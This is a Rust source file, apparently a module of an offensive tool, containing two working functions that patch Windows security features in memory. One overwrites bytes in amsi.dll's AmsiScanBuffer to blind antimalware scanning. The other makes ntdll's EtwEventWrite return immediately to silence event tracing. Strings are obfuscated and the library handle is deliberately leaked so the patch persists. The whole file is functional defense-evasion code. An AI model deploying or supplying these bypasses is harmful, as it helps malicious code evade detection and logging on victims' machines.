use crate::internal::debug::debug_println;
use fmtools::format; // using obfstr to obfuscate
use libloading::{Library, Symbol};
use std::mem;
use std::ptr;
use windows_sys::Wdk::System::SystemServices::PAGE_READWRITE;
use windows_sys::Win32::System::Memory::VirtualProtect;

#[allow(clippy::missing_transmute_annotations)]
pub(crate) fn patch_amsi() -> Result<String, String> {
    let patch_bytes: [u8; 3] = [0x48, 0x31, 0xc0];
    let amsi = Box::new(unsafe {
        Library::new(format!("amsi.dll")).map_err(|_| format!("Failed to load amsi.dll"))?
    });
    // We purposely leak the handle to amsi.dll here to keep the library loaded until exit
    // If we don't do this, the library will be unloaded by libloading when it goes out of scope (end of function)
    let amsi = Box::leak(amsi);

    let amsi_scan_buffer: Symbol<unsafe extern "system" fn()> =
        unsafe { amsi.get(format!("AmsiScanBuffer").as_bytes()) }
            .map_err(|_| format!("Failed to get AmsiScanBuffer"))?;
    let patch_address = unsafe { mem::transmute::<_, *mut u8>(amsi_scan_buffer).offset(0x6a) };
    let mut old_protect: u32 = 0;
    let mut current_bytes: [u8; 3] = [0; 3];

    unsafe { ptr::copy_nonoverlapping(patch_address, current_bytes.as_mut_ptr(), 3) };
    if current_bytes == patch_bytes {
        return Err(format!("AMSI already patched"));
    }

    let result = unsafe {
        VirtualProtect(
            patch_address.cast(),
            patch_bytes.len(),
            PAGE_READWRITE,
            &mut old_protect,
        )
    };
    if result != 0 {
        unsafe { ptr::copy_nonoverlapping(patch_bytes.as_ptr(), patch_address, patch_bytes.len()) };
        unsafe {
            VirtualProtect(
                patch_address.cast(),
                patch_bytes.len(),
                old_protect,
                &mut old_protect,
            )
        };
        debug_println!("AMSI patched successfully at {:p}", patch_address);
        Ok(format!("AMSI patched successfully"))
    } else {
        Err(format!("Failed to patch AMSI"))
    }
}

#[allow(clippy::missing_transmute_annotations)]
pub(crate) fn patch_etw() -> Result<String, String> {
    let patch_bytes: [u8; 1] = [0xc3];
    let ntdll = unsafe {
        Library::new(format!("ntdll.dll")).map_err(|_| format!("Failed to load ntdll.dll"))?
    };
    let etw_event_write: Symbol<unsafe extern "system" fn()> =
        unsafe { ntdll.get(format!("EtwEventWrite").as_bytes()) }
            .map_err(|_| format!("Failed to get EtwEventWrite"))?;
    let patch_address = unsafe { mem::transmute::<_, *mut u8>(etw_event_write) };
    let mut old_protect: u32 = 0;
    let mut current_bytes: [u8; 1] = [0];

    unsafe { ptr::copy_nonoverlapping(patch_address, current_bytes.as_mut_ptr(), 1) };
    if current_bytes == patch_bytes {
        return Err(format!("ETW already patched"));
    }

    let result = unsafe {
        VirtualProtect(
            patch_address.cast(),
            patch_bytes.len(),
            PAGE_READWRITE,
            &mut old_protect,
        )
    };
    if result != 0 {
        unsafe { ptr::copy_nonoverlapping(patch_bytes.as_ptr(), patch_address, patch_bytes.len()) };
        unsafe {
            VirtualProtect(
                patch_address.cast(),
                patch_bytes.len(),
                old_protect,
                &mut old_protect,
            )
        };
        debug_println!("ETW patched successfully at {:p}", patch_address);
        Ok(format!("ETW patched successfully"))
    } else {
        Err(format!("Failed to patch ETW"))
    }
}
